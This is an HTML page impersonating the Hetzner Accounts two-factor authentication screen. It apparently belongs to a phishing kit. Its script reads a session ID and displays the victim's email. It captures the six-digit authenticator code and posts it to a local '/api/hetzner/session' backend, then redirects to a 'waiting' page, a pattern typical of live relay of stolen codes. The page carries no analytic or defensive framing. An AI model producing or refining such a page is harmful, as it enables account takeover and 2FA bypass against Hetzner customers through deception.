<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Two-factor authentication – Hetzner Accounts</title>
  <link rel="icon" href="hetzner-assets/logo-mark.svg" type="image/svg+xml" />
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      min-height: 100vh;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      font-size: 14px;
      color: #383838;
      background: #ededed;
      display: flex;
      flex-direction: column;
    }

    .page {
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 32px 16px;
    }

    .card {
      width: 100%;
      max-width: 400px;
      background: #fff;
      border-radius: 4px;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
      padding: 32px 28px 28px;
    }

    .logo {
      display: flex;
      justify-content: center;
      margin-bottom: 24px;
    }

    h1 {
      font-size: 20px;
      font-weight: 600;
      text-align: center;
      margin-bottom: 12px;
    }

    .intro {
      font-size: 14px;
      line-height: 1.6;
      color: #555;
      text-align: center;
      margin-bottom: 20px;
    }

    .user-row {
      display: flex;
      align-items: center;
      gap: 8px;
      margin-bottom: 20px;
      padding: 10px 12px;
      background: #f5f5f5;
      border-radius: 3px;
      font-size: 14px;
      color: #383838;
    }

    .user-row svg {
      width: 18px;
      height: 18px;
      fill: #8a8a8a;
      flex-shrink: 0;
    }

    .user-row span {
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
    }

    .error {
      background: #fde8ec;
      border: 1px solid #f5c2cb;
      color: #d50c2d;
      padding: 10px 12px;
      border-radius: 3px;
      font-size: 13px;
      margin-bottom: 16px;
    }

    .field label {
      display: block;
      font-size: 13px;
      font-weight: 500;
      margin-bottom: 6px;
    }

    .field input {
      width: 100%;
      height: 48px;
      border: 1px solid #c8c8c8;
      border-radius: 3px;
      padding: 0 12px;
      font-size: 22px;
      font-family: inherit;
      letter-spacing: 0.25em;
      text-align: center;
      outline: none;
    }

    .field input:focus {
      border-color: #d50c2d;
      box-shadow: 0 0 0 2px rgba(213, 12, 45, 0.12);
    }

    .btn {
      width: 100%;
      height: 44px;
      margin-top: 20px;
      border: none;
      border-radius: 3px;
      background: #d50c2d;
      color: #fff;
      font-size: 15px;
      font-weight: 600;
      font-family: inherit;
      cursor: pointer;
    }

    .btn:hover:not(:disabled) { background: #b00a26; }
    .btn:disabled { opacity: 0.7; cursor: wait; }

    .back {
      display: inline-block;
      margin-top: 16px;
      font-size: 13px;
      color: #d50c2d;
      text-decoration: none;
      text-align: center;
      width: 100%;
    }

    footer {
      text-align: center;
      padding: 16px;
      font-size: 12px;
      color: #8a8a8a;
    }
  </style>
</head>
<body>
  <div class="page">
    <div class="card">
      <div class="logo">
        <img src="hetzner-assets/logo-mark.svg" alt="Hetzner Accounts" height="32" />
      </div>
      <h1>Two-factor authentication</h1>
      <p class="intro">
        Geben Sie den 6-stelligen Code aus Ihrer Authenticator-App ein.
      </p>

      <div class="user-row">
        <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
        <span id="display-identifier">—</span>
      </div>

      <div id="code-error" class="error" hidden></div>

      <form id="hetzner-2fa-form" novalidate>
        <div class="field">
          <label for="code">Authentifizierungscode</label>
          <input
            type="text"
            id="code"
            name="code"
            inputmode="numeric"
            autocomplete="one-time-code"
            maxlength="6"
            pattern="[0-9]{6}"
            required
            autofocus
          />
        </div>
        <button type="submit" class="btn" id="submit-btn">Verify</button>
      </form>

      <a class="back" href="hetzner.html">Zurück zum Login</a>
    </div>
  </div>

  <footer>&copy; Hetzner Online GmbH</footer>

  <script src="hetzner-flow.js"></script>
  <script>
    (function () {
      const sessionId = HetznerFlow.requireSession();
      if (!sessionId) return;

      const codeInput = document.getElementById("code");
      const errorBox = document.getElementById("code-error");

      HetznerFlow.loadSessionInfo(sessionId).then(async function (info) {
        if (!info) return;
        document.getElementById("display-identifier").textContent =
          HetznerFlow.getEmail() || info.email || "—";
        if (info.error) {
          HetznerFlow.showError(errorBox, info.error);
          await fetch("/api/hetzner/session/" + encodeURIComponent(sessionId) + "?consume=1");
        }
      });

      codeInput.addEventListener("input", function () {
        this.value = this.value.replace(/\D/g, "").slice(0, 6);
      });

      document.getElementById("hetzner-2fa-form").addEventListener("submit", async function (e) {
        e.preventDefault();
        const code = codeInput.value.trim();
        if (code.length !== 6) return;

        const btn = document.getElementById("submit-btn");
        btn.disabled = true;
        btn.textContent = "Wird überprüft …";
        HetznerFlow.showError(errorBox, "");

        try {
          const data = await HetznerFlow.submitCode(sessionId, code);
          if (!data.ok) throw new Error(data.message || "Failed");
          window.location.href = "hetzner-waiting.html?s=" + encodeURIComponent(sessionId);
        } catch (err) {
          HetznerFlow.showError(errorBox, err.message || "Verbindungsfehler");
          btn.disabled = false;
          btn.textContent = "Verify";
        }
      });
    })();
  </script>
</body>
</html>
